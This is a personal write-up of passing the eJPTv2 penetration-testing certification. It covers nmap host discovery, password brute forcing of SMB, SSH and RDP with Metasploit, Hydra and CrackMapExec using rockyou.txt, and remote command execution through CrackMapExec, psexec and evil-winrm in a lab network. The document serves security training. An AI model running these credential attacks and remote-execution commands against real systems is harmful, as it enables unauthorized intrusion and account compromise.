eJPTv2 — My Experience & Tools Used
> Passed eJPT (eLearnSecurity Junior Penetration Tester) with a score of **80%**.  
> Issued by INE Security. This writeup covers my hands-on experience with the tools used during preparation and the exam lab.
---
🧰 Tools Overview
Tool	Purpose
`nmap`	Network scanning & host discovery
`CrackMapExec`	SMB enumeration & brute force
`Metasploit`	Exploitation & credential attacks
`Hydra`	Password brute forcing
`enum4linux`	SMB/Samba enumeration
`smbclient`	SMB share access
`evil-winrm`	Windows Remote Management shell
---
🔍 1. Network Scanning with Nmap
The first thing in any engagement — know what's on the network.
Host Discovery
```bash
# Find all live hosts in subnet
nmap -sn 192.168.100.0/24
```
Identify Hostnames via SMB
```bash
# Super useful to map IPs to machine names
nmap -p 445 --script=smb-os-discovery 192.168.100.50,51,52,55
```
What I learned: `smb-os-discovery` script is gold — it reveals the computer name, OS version, and workgroup. This is how I identified which IP belonged to which Windows server (e.g., WINSERVER-01, WINSERVER-03).
Sample output:
```
| smb-os-discovery:
|   OS: Windows Server 2019 Datacenter
|   Computer name: WINSERVER-03
|   NetBIOS computer name: WINSERVER-03
|   Workgroup: WORKGROUP
```
---
🔓 2. SMB Brute Force with Metasploit
Once I identified a target, the next step was credential attacks.
Using smb_login Module
```bash
msfconsole -q

use auxiliary/scanner/smb/smb_login
set RHOSTS 192.168.100.55
set SMBUser Administrator
set PASS_FILE /usr/share/wordlists/rockyou.txt
set STOP_ON_SUCCESS true
set VERBOSE false
run
```
What I learned:
`unix_passwords.txt` is small and fast but limited — good for quick attempts
`rockyou.txt` is comprehensive but needs to be extracted first with `gzip -d rockyou.txt.gz`
Always set `STOP_ON_SUCCESS true` to save time once credentials are found
Output `[+] Success: '.\Administrator:swordfish'` means credentials found!
---
⚡ 3. CrackMapExec — Swiss Army Knife for SMB
CrackMapExec (CME) was my favourite tool — fast, clean output, and versatile.
Enumerate SMB
```bash
crackmapexec smb 192.168.100.0/24
```
Brute Force Credentials
```bash
crackmapexec smb 192.168.100.55 -u Administrator -p /usr/share/wordlists/rockyou.txt
```
Execute Commands (Post-Exploitation)
```bash
# Read a file remotely — no need to open a full shell!
crackmapexec smb 192.168.100.55 -u Administrator -p swordfish -x "type C:\Users\Administrator\flag.txt"
```
What I learned: Once you have valid credentials, CME lets you run commands directly via `-x`. The `(Pwn3d!)` tag in the output confirms admin-level access — very satisfying to see!
---
🐉 4. Hydra — Password Brute Forcing
Hydra is great for brute forcing various protocols.
```bash
# SMB
hydra -l Administrator -P /usr/share/wordlists/rockyou.txt 192.168.100.55 smb -t 1

# SSH
hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.100.xx ssh

# RDP
hydra -l Administrator -P /usr/share/wordlists/rockyou.txt rdp://192.168.100.55
```
What I learned: Use `-t 1` for SMB to avoid lockouts. SMB doesn't handle multiple threads well and can cause false failures.
---
🎯 5. Post-Exploitation — Reading Flags
After gaining access, the goal is to navigate the system and retrieve flags.
Via CrackMapExec (no shell needed)
```bash
crackmapexec smb <IP> -u Administrator -p <password> -x "type C:\Users\Administrator\flag.txt"
```
Via PSExec (full shell)
```bash
psexec.py Administrator:<password>@<IP>
# then inside shell:
type C:\Users\Administrator\flag.txt
```
Via Evil-WinRM
```bash
evil-winrm -i <IP> -u Administrator -p <password>
# then:
type C:\Users\Administrator\flag.txt
```
---
📋 My Methodology (Simplified)
```
1. Host Discovery     →  nmap -sn <subnet>
2. Service Scanning   →  nmap -sV -sC -p 445,3389,5985 <target>
3. OS/Hostname ID     →  nmap --script smb-os-discovery
4. Credential Attack  →  metasploit smb_login / hydra / crackmapexec
5. Post-Exploitation  →  crackmapexec -x / psexec / evil-winrm
```
---
💡 Key Takeaways
Always extract rockyou.txt first — `gzip -d /usr/share/wordlists/rockyou.txt.gz`
smb-os-discovery is the fastest way to map hostnames to IPs
CrackMapExec can replace a lot of manual steps — enumerate, brute force, and execute commands all in one tool
STOP_ON_SUCCESS in Metasploit saves a lot of time
Start with smaller wordlists (`unix_passwords.txt`), escalate to `rockyou.txt` if needed
---
🏆 Result
	
Certification	eJPTv2 — eLearnSecurity Junior Penetration Tester
Score	80% (Required: 70%)
Assessment Methodologies	83%
Host & Network Pentesting	70%
Status	✅ Passed
---
Next goal: TryHackMe / HackTheBox practice → OSCP
